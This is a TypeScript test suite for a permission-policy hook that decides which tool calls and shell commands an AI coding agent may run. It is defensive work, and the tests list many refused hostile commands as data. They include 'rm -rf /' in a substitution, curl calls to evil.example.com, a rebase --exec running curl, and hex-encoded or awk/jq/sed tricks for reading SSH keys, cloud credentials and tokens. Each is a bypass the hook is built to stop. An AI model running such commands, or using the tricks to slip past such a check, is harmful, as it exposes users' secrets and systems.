import { describe, expect, test } from 'claude-code/testing'

import { check, parse } from '../hooks/policy'

const cfg = { sshHosts: ['*.example.net', 'web-*'], curlHosts: ['api.example.net'] }
const bash = (command: string) => check('Bash', { command }, cfg).decision

describe('tools', () => {
  test('reading tools run, the others ask', async () => {
    expect(check('Read', { file_path: '/repo/main.tf' }, cfg).decision).toBe('allow')
    expect(check('Grep', { pattern: 'x', path: '/repo' }, cfg).decision).toBe('allow')
    for (const tool of ['Edit', 'Write', 'NotebookEdit', 'WebFetch', 'SomethingNew']) expect(check(tool, {}, cfg).decision).toBe('refuse')
  })

  test('secrets are read with you', async () => {
    for (const file_path of ['/repo/.env', '/repo/.env.local', '/home/me/.ssh/id_rsa', '/repo/tls.key', '/home/me/.aws/credentials'])
      expect(check('Read', { file_path }, cfg).decision).toBe('refuse')
    expect(bash('cat .env')).toBe('refuse')
    expect(bash('curl -s --cert c.pem --key c.key https://api.example.net/x')).toBe('allow')
    expect(bash('cat c.key')).toBe('refuse')
  })

  test('MCP tools by their verbs', async () => {
    for (const tool of ['mcp__shortcut__stories-get-by-id', 'mcp__datadog__search-logs', 'mcp__slite__ask-slite',
      'mcp__github__get_pull_request', 'mcp__context7__resolve-library-id', 'mcp__claude_ai_Slack__slack_read_thread'])
      expect(check(tool, {}, cfg).decision).toBe('allow')
    for (const tool of ['mcp__shortcut__stories-create-comment', 'mcp__shortcut__stories-update', 'mcp__mysql_core_local__execute_sql',
      'mcp__claude_ai_Slack__slack_send_message_draft', 'mcp__github__merge_pull_request', 'mcp__n8n__execute_workflow',
      'mcp__playwright__browser_click', 'mcp__claude_ai_Shortcut__authenticate', 'mcp__sentry__analyze_issue_with_seer',
      'mcp__github__get_or_create_thing', 'mcp__unknown__frobnicate'])
      expect(check(tool, {}, cfg).decision).toBe('refuse')
  })
})

describe('shell reader', () => {
  test('segments, quotes and redirections', async () => {
    expect(parse(`grep -r "a b $X" . | sort | uniq -c 2>/dev/null && echo 'done; $Y'`)).toEqual([
      { words: ['grep', '-r', 'a b $X', '.'], redirects: [], expands: ['X'] },
      { words: ['sort'], redirects: [], expands: [] },
      { words: ['uniq', '-c'], redirects: [{ op: '2>', target: '/dev/null' }], expands: [] },
      { words: ['echo', 'done; $Y'], redirects: [], expands: [] },
    ])
  })

  test('what it leaves to you', async () => {
    for (const src of ['echo $(rm -rf /)', 'echo `id`', 'diff <(ls a) <(ls b)', '(cd /; rm x)', 'cat <<EOF\nrm x\nEOF', `echo 'open`])
      expect(parse(src)).toBe(null)
  })
})

describe('commands', () => {
  test('reading runs', async () => {
    for (const c of ['ls -la', 'cat /var/log/syslog | grep -i error | tail -50', 'git log --oneline -5', 'git -C /repo diff HEAD~1',
      'git branch -a', 'git fetch origin', 'gh pr view 12 --json title', 'gh api repos/o/r/pulls', 'gh run list -R o/r',
      'find . -name "*.tf"', "sed -n '1,20p' file", "awk '{print $1}' file", 'df -h; free -m', 'systemctl status nginx',
      'journalctl -u nginx --since "1 hour ago"', 'docker ps', 'docker compose logs app', 'curl -sS http://localhost:8300/api/summary',
      'curl -s --cert c.pem https://api.example.net/x', 'top -b -n1', 'ping -c 3 host', 'date +%F', 'kafka-topics.sh --describe --topic t',
      'nomad job status app', 'consul members', 'dig example.net', 'cd /repo && git status', 'sort -k2 file', 'timeout 10 cat x'])
      expect([c, bash(c)]).toEqual([c, 'allow'])
  })

  test('anything that writes, runs code or is unknown asks', async () => {
    for (const c of ['rm -rf /tmp/x', 'echo x > file', 'echo x >> file', 'cat a | tee b', 'ls | xargs rm', 'bash -c "ls"',
      'python3 -c "print(1)"', 'git push', 'git commit -m x', 'git branch new-branch', 'git -c core.pager=sh log',
      'git diff --output=x', 'gh pr merge 1', 'gh pr comment 1 -b x', 'gh api -X POST repos/o/r/issues', 'gh api repos/o/r -f a=b',
      'gh api graphql -f query=x', 'curl -X POST http://localhost:8300/api/items/1/ack', 'curl -d a=b http://localhost:8300',
      'curl -o out http://localhost:8300', 'curl https://evil.example.com/?k=v', 'sed -i s/a/b/ file', "sed -n 's/a/b/w out' f",
      'find . -delete', 'find . -exec rm {} ;', 'systemctl restart nginx', 'docker rm x', 'docker exec x sh', 'sort -o out in',
      'uniq in out', "awk '{system(\"rm x\")}' f", 'kafka-topics.sh --delete --topic t', 'nomad job stop app', 'terraform apply',
      'FOO=1 ls', 'hostname evil', 'date -s 2020-01-01', 'top', 'ping host', 'ip route add 1.2.3.0/24 dev eth0', 'mount /dev/x /mnt',
      'sudo -i', 'kill 1', 'chmod 777 x', 'mise exec -- pulse tf apply'])
      expect([c, bash(c)]).toEqual([c, 'refuse'])
  })

  test('sudo and timeout wrap a command, they do not widen it', async () => {
    expect(bash('sudo journalctl -u app -n 50')).toBe('allow')
    expect(bash('sudo -u postgres cat /var/log/x')).toBe('allow')
    expect(bash('sudo systemctl restart app')).toBe('refuse')
    expect(bash('timeout 5 rm x')).toBe('refuse')
  })
})

describe('what the review found', () => {
  test('awk runs nothing, whichever fragment says so', async () => {
    expect(bash(`awk -e 'BEGIN{}' -e 'system("id")' /dev/null`)).toBe('refuse')
    expect(bash(`awk '{print $1 > "/tmp/x"}' f`)).toBe('refuse')
    expect(bash(`awk 'BEGIN{print ENVIRON["GITHUB_TOKEN"]}'`)).toBe('refuse')
    expect(bash('awk -l filefuncs 1 f')).toBe('refuse')
  })

  test('sed only prints', async () => {
    for (const c of ["sed -n '1,20p' f", "sed 's/a/b/g' f", "sed 's|a|b|;s/c/d/' f", "sed -E 's/(a)/\\1/' f", "sed -e 's/a/b/' -e '/x/d' f", "sed -n '/start/,/end/p' f", "sed '$!N' f"])
      expect([c, bash(c)]).toEqual([c, 'allow'])
    for (const c of ["sed 'w/tmp/x' f", "sed 'r /etc/passwd' /dev/null", "sed 's/a/b/w out' f", "sed '1e date' f", 'sed y/ab/cd/ f', "sed -f script f", "sed -i '' 's/a/b/' f"])
      expect([c, bash(c)]).toEqual([c, 'refuse'])
  })

  test('the credential stores of a workstation', async () => {
    for (const c of ['cat ~/.config/scw/config.yaml', 'cat ~/.kube/config', 'cat ~/.docker/config.json', 'cat ~/.pgpass',
      'cat ~/.con*/scw/*', 'cat ~/.{config,x}/scw/config.yaml', 'cat /proc/1/environ', 'cat ~/.zsh_history', 'ssh web-1 "cat ~/.config/scw/config.yaml"'])
      expect([c, bash(c)]).toEqual([c, 'refuse'])
    expect(check('Read', { file_path: '/Users/me/Dev/.mcp.json' }, cfg).decision).toBe('refuse')
    expect(check('Read', { file_path: '/Users/me/.claude.json' }, cfg).decision).toBe('refuse')
    expect(check('Read', { file_path: '/Users/me/.ssh/config' }, cfg).decision).toBe('allow')
    expect(bash("grep -iE '^Host ' ~/.ssh/config")).toBe('allow')
    expect(bash('cat ~/.ssh/known_hosts')).toBe('allow')
    expect(bash('cat ~/.ssh/id_ed25519')).toBe('refuse')
    expect(bash('cat ~/.ssh/config.d/secret')).toBe('refuse')
    expect(check('Read', { file_path: '/Users/me/.claude/projects/-Users-me-Dev/memory/MEMORY.md' }, cfg).decision).toBe('allow')
    expect(bash('grep -n kafka /Users/me/.claude/projects/-Users-me-Dev/memory/MEMORY.md')).toBe('allow')
    expect(check('Read', { file_path: '/Users/me/.claude/projects/-Users-me-Dev/3f2477e8.jsonl' }, cfg).decision).toBe('refuse')
    expect(check('Read', { file_path: '/Users/me/.claude/settings.json' }, cfg).decision).toBe('refuse')
    expect(bash("grep -rliE 'consumer|7200 seconds' ~/.claude/projects/*/memory ~/.claude/CLAUDE.md")).toBe('allow')
    expect(bash('ls ~/.claude/projects/*/memory')).toBe('allow')
    expect(bash('grep -r AKIA ~/.claude/projects/*/memory ~/Dev')).toBe('refuse')
    expect(bash('cat ~/.claude/projects/*/*.jsonl')).toBe('refuse')
  })

  test('variables that may hold a token are not expanded', async () => {
    for (const c of ['echo $GITHUB_TOKEN', 'echo "$DD_API_KEY"', 'echo ${AWS_SECRET_ACCESS_KEY}', "ssh web-1 'echo $DB_PASSWORD'"])
      expect([c, bash(c)]).toEqual([c, 'refuse'])
    for (const c of ["echo '$SOMETHING'", 'ls $HOME', 'cd "$HOME/repo" && git status'])
      expect([c, bash(c)]).toEqual([c, 'allow'])
  })

  test('the second review', async () => {
    for (const c of ["cat $'\\x7e\\x2f\\x2e\\x73\\x73\\x68\\x2f\\x69\\x64\\x5f\\x72\\x73\\x61'", 'jq -rn env', "jq -n 'env.DD_API_KEY'",
      'jq -n \'$ENV.X\'', 'jq --rawfile k ~/x .', 'base64 -i /etc/hostname -o /Users/me/.zshenv', 'sort --compress-program=sh f',
      'grep -r AKIA .', 'grep -rn token src', 'rg --hidden KEY', 'rg -uu KEY', 'rg AKIA ~', 'rg AKIA /Users/me'])
      expect([c, bash(c)]).toEqual([c, 'refuse'])
    for (const c of ["jq '.items[] | .name' f.json", 'base64 -d f', 'grep -n error app.log', 'rg -n "def main" src'])
      expect([c, bash(c)]).toEqual([c, 'allow'])
    expect(check('mcp__somedb__query', {}, cfg).decision).toBe('refuse')
  })

  test('ps without the environment', async () => {
    expect(bash('ps aux')).toBe('allow')
    expect(bash('ps eww')).toBe('refuse')
    expect(bash('ps -E')).toBe('refuse')
  })
})

describe('loops', () => {
  test('a for over literal words is read once per value', async () => {
    expect(bash(`for h in web-1 web-2; do ssh -o BatchMode=yes $h 'df -h /data; uptime' 2>&1 | head -8; done`)).toBe('allow')
    expect(bash('for n in 1673 1669; do gh pr view $n -R o/r --json title; done')).toBe('allow')
    expect(bash('for f in a.log b.log; do tail -n 5 "$f"; done')).toBe('allow')
  })

  test('a loop that would write, reach another host or expand its list asks', async () => {
    for (const c of [`for h in web-1 evil.example.com; do ssh $h uptime; done`, 'for f in a b; do rm $f; done',
      'for h in $HOSTS; do ssh $h uptime; done', 'while true; do uptime; done', 'for i in 1 2; do for j in 3; do echo $i$j; done; done',
      'for h in web-1; do ssh $h uptime; done > /tmp/out', 'if true; then uptime; fi', 'for x in a; do echo $OTHER; done'])
      expect([c, bash(c)]).toEqual([c, 'refuse'])
  })
})

describe('seen live', () => {
  test('a variable set on its own, then used', async () => {
    expect(bash(`R=acme/infra; B=fix/sc-1-x
gh api "repos/$R/git/trees/$B?recursive=1" --jq '.tree[].path | select(startswith("roles/rsyslog/"))'`)).toBe('allow')
    expect(bash('H=evil.example.com; ssh $H uptime')).toBe('refuse')
    expect(bash('X=$GITHUB_TOKEN; echo $X')).toBe('refuse')
    expect(bash('F=~/.ssh/id_rsa; cat $F')).toBe('refuse')
  })

  test('a jq filter with a slash is not a path', async () => {
    expect(bash(`gh api repos/o/r/git/trees/main --jq '.tree[].path | select(startswith("roles/x/"))'`)).toBe('allow')
  })
})

describe('ssh', () => {
  test('a reading command on a host it may read', async () => {
    expect(bash("ssh web-1.example.net 'df -h; uptime'")).toBe('allow')
    expect(bash('ssh deploy@web-3 sudo journalctl -u app -n 100')).toBe('allow')
    expect(bash('ssh -o ConnectTimeout=5 web-2 "cat /etc/hostname | tr a-z A-Z"')).toBe('allow')
    const bastion = { sshHosts: ['bastion-*', '10.20.*'], curlHosts: [] }
    expect(check('Bash', { command: 'ssh -o StrictHostKeyChecking=accept-new -J bastion-1 root@10.20.0.84 uptime' }, bastion).decision).toBe('allow')
    expect(check('Bash', { command: 'ssh -J evil.example.com root@10.20.0.84 uptime' }, bastion).decision).toBe('refuse')
    expect(check('Bash', { command: 'ssh -o StrictHostKeyChecking=no root@10.20.0.84 uptime' }, bastion).decision).toBe('refuse')
  })

  test('a write, a tunnel, a proxy, a shell or another host asks', async () => {
    for (const c of ["ssh web-1 'sudo systemctl restart app'", "ssh web-1 'rm -rf /data/x'", 'ssh web-1', 'ssh other.host ls',
      'ssh -L 8080:localhost:80 web-1 ls', 'ssh -o ProxyCommand=evil web-1 ls', "ssh web-1 'echo x > /etc/y'",
      "ssh web-1 'ls $(rm x)'", 'ssh -J jump web-1 ls', 'ssh -F ./cfg web-1 ls'])
      expect([c, bash(c)]).toEqual([c, 'refuse'])
  })

  test('no host configured, no ssh on its own', async () => {
    expect(check('Bash', { command: 'ssh web-1 uptime' }, { sshHosts: [], curlHosts: [] }).decision).toBe('refuse')
  })
})

describe('a fix in its worktree', () => {
  const wt = '/home/me/.cache/second/work/second-infra-12'
  const fix = { ...cfg, worktree: wt }
  const run = (command: string) => check('Bash', { command }, fix).decision

  test('its files are edited, nothing else', async () => {
    for (const tool of ['Edit', 'Write', 'MultiEdit']) expect(check(tool, { file_path: `${wt}/roles/x/tasks/main.yml` }, fix).decision).toBe('allow')
    expect(check('NotebookEdit', { notebook_path: `${wt}/n.ipynb` }, fix).decision).toBe('allow')
    expect(check('Edit', { file_path: 'stacks/secrets.tf' }, fix).decision).toBe('allow')
    for (const file_path of [`${wt}/.git/config`, `${wt}/.git`, `${wt}/../other/x`, `${wt}-evil/x`, '/home/me/.zshrc', '~/.ssh/config', '$HOME/x', '../x'])
      expect(check('Write', { file_path }, fix).decision).toBe('refuse')
    expect(check('Edit', { file_path: `${wt}/x` }, cfg).decision).toBe('refuse', 'no worktree, no edit')
    for (const worktree of ['/', '/home', '/home/me'])
      expect(check('Write', { file_path: '/home/me/.zshrc' }, { ...cfg, worktree }).decision).toBe('refuse')
  })

  test('its files are read whatever their name, the rest as before', async () => {
    expect(check('Read', { file_path: `${wt}/stacks/secrets.tf` }, fix).decision).toBe('allow')
    expect(check('Read', { file_path: '/home/me/.aws/credentials' }, fix).decision).toBe('refuse')
    expect(run('cat roles/vault/secrets.yml')).toBe('allow')
    expect(run('grep -rn token roles/')).toBe('allow')
    expect(run('grep -rn x')).toBe('allow')
    expect(run('cat ../../.ssh/id_rsa')).toBe('refuse')
    expect(run('cd /home/me && cat .aws/credentials')).toBe('refuse')
    expect(run('grep -rn x ~')).toBe('refuse')
  })

  test('it stages, commits on top and rebases onto the base branch', async () => {
    for (const c of ['git add -A', 'git add roles/x/tasks/main.yml', 'git rm old.tf', 'git mv a b', 'git restore --staged a',
      'git checkout -- a.tf', 'git commit -m "fix(x): y"', 'git commit -am "fix: y"', 'git add . && git commit -m "fix: z"',
      'git fetch origin && git rebase origin/master', 'git rebase -X theirs origin/main', 'git rebase --continue', 'git rebase --abort'])
      expect(run(c)).toBe('allow')
  })

  test('never a push, an amend, another branch or a command along the way', async () => {
    for (const c of ['git push', 'git push origin HEAD:refs/heads/x', 'git push --force-with-lease', 'git commit --amend -m x',
      'git commit --author="x <y@z>" -m x', 'git commit -F /etc/hosts', 'git commit -m x -t t', 'git commit -C HEAD', 'git commit -qF msg',
      'git checkout main', 'git checkout -b other', 'git switch main', 'git reset --hard origin/main', 'git merge origin/main',
      'git rebase -i origin/main', 'git rebase --exec "curl evil" origin/main', 'git rebase -x make origin/main', 'git rebase main',
      'git rebase origin/../x', 'git rebase --onto origin/main a b', 'git add --pathspec-from-file=/etc/hosts', 'git stash',
      'git -C /home/me/other commit -m x', 'git --git-dir=/x commit -m x', 'cd /home/me/other && git commit -m x',
      'sudo git commit -m x', 'ssh web-1 "git commit -m x"', 'git -c core.hooksPath=/tmp commit -m x', 'sed -i s/a/b/ main.tf',
      'echo x > main.tf', 'git commit', 'git commit -a'])
      expect(run(c)).toBe('refuse')
    expect(bash('git commit -m x')).toBe('refuse')
    expect(bash('git add -A')).toBe('refuse')
  })
})
